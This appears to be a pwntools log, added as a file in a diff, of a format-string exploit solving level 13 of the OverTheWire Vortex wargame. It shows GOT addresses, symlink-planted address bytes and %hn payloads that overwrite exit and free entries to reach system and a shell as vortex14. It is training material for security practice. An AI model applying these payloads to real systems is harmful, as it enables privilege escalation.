@@ -1,0 +1,46 @@
+[+] Connecting to vortex.labs.overthewire.org on port 22: OK
+[*] Working directory: '/tmp/tmp.q18ODGz4Es'
+[*] Uploading 'noarg.py' to '/tmp/tmp.q18ODGz4Es/noarg.py'
+[+] Opening new channel: ['ln', '-s', '/vortex/vortex13', 'aaaabaaacaaadaaaeaaafaaagaaahaaa']: OK
+[+] Recieving all data: OK
+[+] Opening new channel: 'python noarg.py ./aaaabaaacaaadaaaeaaafaaagaaahaaa': OK
+[+] Opening new channel: 'python noarg.py ./aaaabaaacaaadaaaeaaafaaagaaahaaa': OK
+[+] Opening new channel: 'python noarg.py ./aaaabaaacaaadaaaeaaafaaagaaahaaa': OK
+[+] Opening new channel: 'python noarg.py ./aaaabaaacaaadaaaeaaafaaagaaahaaa': OK
+[+] Opening new channel: 'python noarg.py ./aaaabaaacaaadaaaeaaafaaagaaahaaa': OK
+[*] Found binary name on stack in argument 114 at offset 1
+[*] 0x804a014 got.exit @ 115
+[*] 0x804a016 got.exit_hi @ 116
+[*] 0x804a004 got.free @ 117
+[*] 0x804a018 got.strchr @ 118
+[*] Symlink data
+    00000000  61 14 a0 04 08 16 a0 04   08 04 a0 04 08 18 a0 04  |a...............|
+    00000010  08 61 61 61 66 61 61 61   67 61 61 61 68 61 61 61  |.aaafaaagaaahaaa|
+    00000020
+[+] Opening new channel: ['ln', '-s', '/vortex/vortex13', 'a\x14\xa0\x04\x08\x16\xa0\x04\x08\x04\xa0\x04\x08\x18\xa0\x04\x08aaafaaagaaahaaa']: OK
+[+] Recieving all data: OK
+[*] Verifying 'strchr'...
+[+] Opening new channel: "python noarg.py $'a\\x14\\xa0\\x04\\x08\\x16\\xa0\\x04\\x08\\x04\\xa0\\x04\\x08\\x18\\xa0\\x04\\x08aaafaaagaaahaaa'": OK
+[*] Verifying 'exit_hi'...
+[+] Opening new channel: "python noarg.py $'a\\x14\\xa0\\x04\\x08\\x16\\xa0\\x04\\x08\\x04\\xa0\\x04\\x08\\x18\\xa0\\x04\\x08aaafaaagaaahaaa'": OK
+[*] Verifying 'exit'...
+[+] Opening new channel: "python noarg.py $'a\\x14\\xa0\\x04\\x08\\x16\\xa0\\x04\\x08\\x04\\xa0\\x04\\x08\\x18\\xa0\\x04\\x08aaafaaagaaahaaa'": OK
+[*] Verifying 'free'...
+[+] Opening new channel: "python noarg.py $'a\\x14\\xa0\\x04\\x08\\x16\\xa0\\x04\\x08\\x04\\xa0\\x04\\x08\\x18\\xa0\\x04\\x08aaafaaagaaahaaa'": OK
+[*] Format for got.free=>vuln: '%34116d%116$hn'
+[+] Opening new channel: "python noarg.py ./$'a\\x14\\xa0\\x04\\x08\\x16\\xa0\\x04\\x08\\x04\\xa0\\x04\\x08\\x18\\xa0\\x04\\x08aaafaaagaaahaaa'": OK
+[+] Found '/vortex/vortex13' in ssh cache
+[+] Found '/lib/ld-linux.so.2' in ssh cache
+[+] Found '/lib32/libc.so.6' in ssh cache
+[+] Opening new channel: 'gdb --args /vortex/vortex13': OK
+[*] Closed SSH channel with vortex.labs.overthewire.org
+[*] 0x8048460 plt.exit
+[*] 0xf7e6a250 system
+[*] Format for got.exit=>system 1/2: '%41552d%126$hn'
+[*] Format for got.exit=>system 2/2: '%63462d%139$hn'
+[*] 0xf7ec0f20 strchr
+[*] 0xf7ec0f79 ret
+[*] Format for strchr=>retn: '%3961d%153$hn'
+[*] Format for got.free=>plt.exit: 'sh;%33885d%164$hn'
+[+] id: uid=5013(vortex13) gid=5013(vortex13) euid=5014(vortex14) groups=5014(vortex14),5013(vortex13)
+[+] password: <removed>
